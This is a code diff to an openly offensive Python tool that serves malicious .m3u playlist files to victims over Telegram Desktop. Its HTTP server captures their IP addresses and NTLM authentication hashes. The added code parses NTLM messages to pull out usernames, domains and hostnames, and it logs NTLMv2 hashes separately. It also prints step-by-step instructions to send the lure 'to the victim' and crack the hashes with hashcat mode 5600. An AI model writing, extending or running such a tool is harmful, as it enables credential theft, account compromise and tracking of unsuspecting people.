@@ -13,6 +13,8 @@ import argparse
 import urllib.request
 import random
 import webbrowser
+import struct
+import binascii
 
 # Step 1: Set up logging for both IPs and NTLM hashes
 logging.basicConfig(filename='ip_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')
@@ -21,6 +23,13 @@ ntlm_handler = logging.FileHandler('ntlm_log.txt')
 ntlm_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
 ntlm_logger.addHandler(ntlm_handler)
 ntlm_logger.setLevel(logging.INFO)
+
+# Create NTLMv2 specific logger
+ntlmv2_logger = logging.getLogger('ntlmv2')
+ntlmv2_handler = logging.FileHandler('ntlmv2_log.txt')
+ntlmv2_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
+ntlmv2_logger.addHandler(ntlmv2_handler)
+ntlmv2_logger.setLevel(logging.INFO)
 
 # Create console logger for real-time display
 console_logger = logging.getLogger('console')
@@ -145,6 +154,65 @@ class NtlmRequestHandler(http.server.SimpleHTTPRequestHandler):
         """
         return html.encode()
 
+    def parse_ntlm_message(self, ntlm_data):
+        """Parse NTLM message to determine message type and extract relevant fields"""
+        try:
+            decoded_data = base64.b64decode(ntlm_data)
+            
+            # NTLM messages start with "NTLMSSP\0"
+            if not decoded_data.startswith(b'NTLMSSP\0'):
+                return {'type': 'unknown', 'data': ntlm_data}
+            
+            # Message type is at offset 8 (4 bytes)
+            message_type = struct.unpack('<I', decoded_data[8:12])[0]
+            
+            if message_type == 1:
+                return {'type': 'negotiate', 'data': ntlm_data}
+            
+            elif message_type == 2:
+                return {'type': 'challenge', 'data': ntlm_data}
+            
+            elif message_type == 3:
+                # This is an authenticate message (contains the hash)
+                result = {'type': 'authenticate', 'data': ntlm_data}
+                
+                # Check for NTLMv2 indicators
+                # NTLMv2 response is longer than NTLMv1
+                # Check for certain flag value at position 60
+                flags = struct.unpack('<I', decoded_data[60:64])[0]
+                ntlm_version = "NTLMv1"
+                
+                # Check for NTLMv2 flags (bit 0x80000 is set for NTLM2)
+                if flags & 0x80000:
+                    ntlm_version = "NTLMv2"
+                
+                # Extract more information if available
+                try:
+                    domain_len = struct.unpack('<H', decoded_data[28:30])[0]
+                    domain_offset = struct.unpack('<I', decoded_data[32:36])[0]
+                    username_len = struct.unpack('<H', decoded_data[36:38])[0]
+                    username_offset = struct.unpack('<I', decoded_data[40:44])[0]
+                    hostname_len = struct.unpack('<H', decoded_data[44:46])[0]
+                    hostname_offset = struct.unpack('<I', decoded_data[48:52])[0]
+                    
+                    domain = decoded_data[domain_offset:domain_offset+domain_len].decode('utf-16-le', errors='ignore')
+                    username = decoded_data[username_offset:username_offset+username_len].decode('utf-16-le', errors='ignore')
+                    hostname = decoded_data[hostname_offset:hostname_offset+hostname_len].decode('utf-16-le', errors='ignore')
+                    
+                    result['domain'] = domain
+                    result['username'] = username
+                    result['hostname'] = hostname
+                    result['version'] = ntlm_version
+                except Exception as e:
+                    result['parse_error'] = str(e)
+                
+                return result
+            
+            return {'type': f'unknown_type_{message_type}', 'data': ntlm_data}
+            
+        except Exception as e:
+            return {'type': 'error', 'error': str(e), 'data': ntlm_data}
+
     def do_GET(self):
         # Get and log the client's real IP address and port
         client_ip, client_port = self.get_client_ip_port()
@@ -204,21 +272,65 @@ class NtlmRequestHandler(http.server.SimpleHTTPRequestHandler):
         if auth_header.startswith('NTLM'):
             ntlm_data = auth_header.split(' ')[1]
             try:
-                # Decode the NTLM message
-                decoded_data = base64.b64decode(ntlm_data)
-                ntlm_message = f"NTLM Message from {client_ip}:{client_port}: {ntlm_data}"
+                # Parse the NTLM message
+                ntlm_info = self.parse_ntlm_message(ntlm_data)
                 
-                # Log to NTLM file
-                ntlm_logger.info(ntlm_message)
+                # Log the message type and content
+                if ntlm_info['type'] == 'negotiate':
+                    # This is the initial NTLM negotiate message
+                    console_logger.info(f"[NTLM NEGOTIATE] Received from {client_ip}:{client_port}")
+                    
+                    # Generate a challenge response (type 2 message)
+                    # In a real implementation, this would be more complex
+                    self.send_response(401)
+                    self.send_header('WWW-Authenticate', 'NTLM TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==')
+                    self.send_header('Content-type', 'text/html')
+                    self.end_headers()
+                    self.wfile.write(b"Send credentials")
+                    return
                 
-                # Display in terminal immediately
-                console_logger.info(f"[NTLM HASH CAPTURED] from {client_ip}:{client_port}")
+                elif ntlm_info['type'] == 'authenticate':
+                    # This is the authentication message containing hashes
+                    
+                    # Create a detailed log entry
+                    ntlm_version = ntlm_info.get('version', 'Unknown')
+                    username = ntlm_info.get('username', 'Unknown')
+                    domain = ntlm_info.get('domain', '')
+                    hostname = ntlm_info.get('hostname', 'Unknown')
+                    
+                    # Format for hash cracking tools
+                    user_string = f"{domain}\\{username}" if domain else username
+                    
+                    # Log the capture with user details
+                    capture_message = f"[{ntlm_version} HASH CAPTURED] from {client_ip}:{client_port} - User: {user_string}, Host: {hostname}"
+                    console_logger.info(capture_message)
+                    
+                    # Detailed log for NTLM hash
+                    hash_data = f"{user_string}:{client_ip}:{ntlm_data}"
+                    ntlm_logger.info(hash_data)
+                    
+                    # If it's NTLMv2, log to the dedicated file
+                    if ntlm_version == "NTLMv2":
+                        ntlmv2_logger.info(hash_data)
+                        console_logger.info(f"[NTLMv2 HASH] Captured and saved to ntlmv2_log.txt")
+                    
+                    # Send success response
+                    self.send_response(200)
+                    self.send_header('Content-type', 'text/html')
+                    self.end_headers()
+                    self.wfile.write(b"Authentication successful")
                 
-                # Send success response
-                self.send_response(200)
-                self.send_header('Content-type', 'text/html')
-                self.end_headers()
-                self.wfile.write(b"Authentication successful")
+                else:
+                    # Unknown NTLM message type
+                    console_logger.info(f"[NTLM] Unknown message type from {client_ip}:{client_port}: {ntlm_info['type']}")
+                    ntlm_logger.info(f"Unknown NTLM message from {client_ip}:{client_port}: {ntlm_data}")
+                    
+                    # Send a generic response
+                    self.send_response(200)
+                    self.send_header('Content-type', 'text/html')
+                    self.end_headers()
+                    self.wfile.write(b"Received")
+                
             except Exception as e:
                 error_msg = f"Error processing NTLM data from {client_ip}:{client_port}: {str(e)}"
                 ntlm_logger.error(error_msg)
@@ -262,7 +374,11 @@ def generate_m3u_file(server_url):
     with open("ip_detect.m3u", "w") as f:
         f.write(server_url + "/ip")
     
-    print("Generated ipltlmhash.m3u and ip_detect.m3u files")
+    # Create a version specifically for NTLMv2 hash detection
+    with open("ntlmv2_hash.m3u", "w") as f:
+        f.write(server_url + "/ntlmv2hash.mp3")
+    
+    print("Generated ipltlmhash.m3u, ip_detect.m3u, and ntlmv2_hash.m3u files")
 
 # Step 5: Function to get the location of an IP address using ipapi.co
 def get_location(ip):
@@ -350,6 +466,24 @@ def check_ntlm_logs():
     print("\nCaptured NTLM Hashes:")
     for line in lines:
         print(line.strip())
+    
+    # Check for NTLMv2 specific hashes
+    if os.path.exists('ntlmv2_log.txt'):
+        with open('ntlmv2_log.txt', 'r') as f:
+            ntlmv2_lines = f.readlines()
+        
+        if ntlmv2_lines:
+            print("\nCaptured NTLMv2 Hashes (recommended for cracking):")
+            for line in ntlmv2_lines:
+                print(line.strip())
+            
+            print("\nTo crack NTLMv2 hashes with hashcat:")
+            print("1. Save the hash content to a file")
+            print("2. Run: hashcat -m 5600 hashes.txt wordlist.txt")
+        else:
+            print("\nNo NTLMv2 hashes captured.")
+    else:
+        print("\nNo NTLMv2 log file found. No NTLMv2 authentication attempts were made.")
 
 # Step 8: Example of how a client might use requests-ntlm to authenticate (for context)
 def test_ntlm_client(server_url, username, password):
@@ -536,12 +670,15 @@ if __name__ == "__main__":
     print(f"1. Send the 'ipltlmhash.m3u' file to the victim via Telegram Desktop (Windows).")
     print(f"   - This attempts to capture IP + Port and the NTLM hashes.")
     print(f"   OR")
+    print(f"   Send the 'ntlmv2_hash.m3u' file to the victim, which will specifically focus on capturing NTLMv2 hashes.")
+    print(f"   OR")
     print(f"   Send the 'ip_detect.m3u' file to the victim, which will automatically direct them to the IP detection page.")
     print(f"2. Wait for the victim to open the file, which may trigger a request to your server.")
     print(f"3. If the victim's system supports NTLM authentication, the server may capture the NTLM hash.")
-    print(f"4. To get the client's real public IP address, have them visit: {server_url}/ip")
+    print(f"4. NTLMv2 hashes (stronger authentication) will be stored separately in ntlmv2_log.txt")
+    print(f"5. To get the client's real public IP address, have them visit: {server_url}/ip")
     print(f"   This will serve a page that uses JavaScript to detect their public IP and report it back.")
-    print(f"5. Press Ctrl+C to stop the server and check the captured IPs and NTLM hashes.\n")
+    print(f"6. Press Ctrl+C to stop the server and check the captured IPs and NTLM hashes.\n")
 
     try:
         # Keep the script running until the user stops it
@@ -561,9 +698,8 @@ if __name__ == "__main__":
         check_ntlm_logs()
 
         print("\nImportant Notes:")
-        print("1. The requests-ntlm library is designed for client-side NTLM authentication, not server-side.")
-        print("   This script manually requests NTLM authentication, but it does not fully process the NTLM handshake.")
-        print("   For proper NTLM hash capture, consider using tools like Impacket or Responder.")
-        print("2. NTLM hash capture depends on the victim's system attempting NTLM authentication.")
+        print("1. NTLMv2 hashes are more secure and harder to crack than NTLMv1 hashes.")
+        print("2. To crack NTLMv2 hashes, use hashcat with mode 5600: hashcat -m 5600 hashes.txt wordlist.txt")
+        print("3. NTLM hash capture depends on the victim's system attempting NTLM authentication.")
         print("   This may not occur if Telegram does not trigger NTLM for HTTP requests, or if the victim's system blocks such authentication.")
-        print("3. Captured NTLM hashes can be cracked using tools like Hashcat or John the Ripper, but this is beyond the scope of this script.")
+        print("4. For more advanced NTLM hash capture, consider using specialized tools like Responder or Impacket.")
